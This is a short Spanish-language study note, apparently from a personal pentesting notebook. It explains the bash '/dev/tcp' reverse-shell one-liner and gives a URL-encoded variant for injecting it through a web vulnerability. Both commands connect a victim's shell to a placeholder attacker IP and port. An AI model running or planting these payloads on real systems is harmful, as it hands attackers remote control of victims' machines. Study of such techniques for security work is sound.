
---

### Comando para Entablar una Reverse Shell

El siguiente comando se utiliza para crear una **reverse shell** desde una máquina víctima hacia una máquina atacante. Esto es útil cuando tienes acceso a ejecutar comandos en la máquina víctima, por ejemplo, a través de una vulnerabilidad en una aplicación web.

El comando es el siguiente:

```bash
bash -c "bash -i >& /dev/tcp/[ip_atacante]/[puerto] 0>&1"
```

Sin embargo, si estás inyectando este comando en una URL, el carácter `&` es reservado y debe ser reemplazado por `%26`. El comando modificado para uso en una URL sería:

```bash
bash -c "bash -i >%26 /dev/tcp/[ip_atacante]/[puerto] 0>%261"
```

---

### Explicación Detallada del Comando

Vamos a desglosar el comando paso a paso para entender qué hace cada parte:

1. **`bash -c`**:
   - Este comando le dice a la shell (intérprete de comandos) que ejecute el siguiente string como un comando.
   - Es útil cuando quieres ejecutar un comando complejo o una cadena de comandos desde una sola línea.

2. **`bash -i`**:
   - Aquí se inicia una nueva instancia de `bash` en modo **interactivo** (`-i`).
   - El modo interactivo permite que la shell acepte entradas del usuario y muestre salidas, lo cual es esencial para una reverse shell.

3. **`>& /dev/tcp/[ip_atacante]/[puerto]`**:
   - Esta parte redirige la salida estándar (`stdout`) y la salida de error (`stderr`) de la shell a una conexión TCP.
   - `/dev/tcp/[ip_atacante]/[puerto]` es una característica de Bash que permite abrir una conexión TCP hacia la dirección IP y puerto especificados.
     - `[ip_atacante]`: Debes reemplazar esto con la dirección IP de la máquina atacante.
     - `[puerto]`: Debes reemplazar esto con el puerto en el que la máquina atacante está escuchando.
   - En resumen, esta parte envía la salida de la shell (lo que se escribe en la terminal) a través de la red hacia el atacante.

4. **`0>&1`**:
   - Esto lo que hace es redirigir la entrada estándar (`stdin`) de la shell hacia la misma conexión TCP.
   - En otras palabras, cualquier dato que el atacante envíe a través de la conexión TCP será tratado como entrada para la shell en la máquina víctima.
   - Esto permite que el atacante interactúe con la shell remota como si estuviera directamente en la máquina víctima.

> Recordar que 
- 0 es `stdin`
- 1 es `stdout` 
- 2 es `stderr`.

---

[[bash]]
[[stder_stdout]]
[[Reverse Shell]]